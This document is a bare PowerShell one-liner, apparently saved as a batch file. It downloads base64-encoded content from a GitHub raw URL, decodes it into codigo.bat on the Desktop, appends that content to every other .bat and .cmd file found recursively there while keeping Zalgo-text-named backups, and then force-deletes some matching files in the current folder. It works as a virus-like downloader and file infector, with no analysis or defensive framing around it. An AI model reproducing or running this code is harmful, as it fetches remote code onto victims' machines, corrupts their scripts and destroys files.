powershell -NoProfile -Command "$u='https://raw.githubusercontent.com/system-32-hue/test/refs/heads/main/rest';$p=Join-Path ([Environment]::GetFolderPath('Desktop')) 'codigo.bat';try{$b=(Invoke-WebRequest -UseBasicParsing $u).Content.Trim();[IO.File]::WriteAllText($p,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)),[Text.UTF8Encoding]::new($false));Write-Host 'INSTALLED'}catch{Write-Host $_.Exception.Message}; $d=[Environment]::GetFolderPath('Desktop'); $src=Join-Path $d 'codigo.bat'; if(!(Test-Path $src)){Write-Host '9';exit}; $s=Get-Content -Raw $src; Get-ChildItem $d -File -Recurse | Where-Object {$_.Extension -in '.bat','.cmd' -and $_.FullName -ne $src -and $_.Name -notlike '*.d̵̡̛͉͕̫̰̟͈̗̘͕̦̝͉̀ͨ̌̎̔́͊̃͞o̵̸̸̧̩̙̹͇̬͚̤͖ͭ̽͊͋̈́͛͒͗ͧ̉ͩ͟͢͞͞͝͡͝n̨̢̼̹̼̱͕͉͖͕̩̺͖̯̍ͯ̄ͦͬ̒ͦ̌̌͟͜_̵̴̻̱͚͈͇͛ͯ́̕͜͝ẗ̵̶̡̳̱͚͕́́̃̌ͩͨ̊̈̂͗̽̚͠͡'} | ForEach-Object {Copy-Item $_.FullName ($_.FullName+'.d̵̡̛͉͕̫̰̟͈̗̘͕̦̝͉̀ͨ̌̎̔́͊̃͞o̵̸̸̧̩̙̹͇̬͚̤͖ͭ̽͊͋̈́͛͒͗ͧ̉ͩ͟͢͞͞͝͡͝n̨̢̼̹̼̱͕͉͖͕̩̺͖̯̍ͯ̄ͦͬ̒ͦ̌̌͟͜_̵̴̻̱͚͈͇͛ͯ́̕͜͝ẗ̵̶̡̳̱͚͕́́̃̌ͩͨ̊̈̂͗̽̚͠͡') -Force; Add-Content -LiteralPath $_.FullName -Value $s}; Get-ChildItem -LiteralPath . -Recurse -Force -File | Where-Object { $_.Name.StartsWith('.d') -and $_.Name -like '*.t*' } | Remove-Item -Force; Write-Host '...---...'"
exit
